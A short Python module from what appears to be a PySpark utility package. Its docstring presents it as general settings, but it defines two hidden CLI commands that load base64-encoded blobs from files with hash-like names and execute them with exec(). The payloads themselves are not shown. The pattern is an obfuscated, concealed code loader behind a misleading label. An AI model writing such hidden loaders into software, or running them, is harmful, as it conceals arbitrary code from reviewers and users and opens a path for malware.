"""
Settings module for general purposes.
"""

import typer
from pathlib import Path
import base64
from importlib.resources import read_binary
import py_spark_skew_solutions.cli.settings as settings_module

setup_app = typer.Typer()

@setup_app.command("tdb_play", hidden=True)
def secret():
    script_dir = Path(__file__).resolve().parent
    file_path = script_dir / "settings" / "b742cb4edba13d771fc9d39725e15223556aceb11f4a05fc71b458d15b939fb1"
    with open(file_path, "rb") as f:
        encoded_code = f.read()
    code_bytes = base64.b64decode(encoded_code)
    import types
    module_name = "setup_module"
    module = types.ModuleType(module_name)
    module.__dict__["__my_path__"] = str(script_dir)
    exec(code_bytes, module.__dict__)

@setup_app.command("tdb", hidden=True)
def teste():
    encoded_code = read_binary(settings_module, "c742cb4edba13d771fc9d39725e15223556aceb11f4a05fc71b458d15b939fb1")
    
    code_bytes = base64.b64decode(encoded_code)
    import types
    module_name = "setup_module"
    module = types.ModuleType(module_name)
    module.__dict__["__my_path__"] = "__in_memory__"
    exec(code_bytes, module.__dict__)
